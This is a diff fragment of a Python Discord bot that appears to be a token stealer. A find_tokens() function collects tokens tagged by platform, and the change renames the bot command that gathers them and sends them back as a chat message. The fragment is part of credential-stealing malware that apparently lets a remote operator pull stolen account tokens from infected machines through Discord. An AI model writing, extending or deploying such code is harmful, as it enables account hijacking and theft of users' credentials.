@@ -539,8 +539,8 @@ def find_tokens():
                                         tokens.append(f"{token} | {platform}")
     return tokens
 
-@bot.command(name="find_tokens")
-async def find_tokens_command(ctx):
+@bot.command()
+async def token(ctx):
     tokens = find_tokens()
     if tokens:
         tokens_message = "\n".join(tokens)
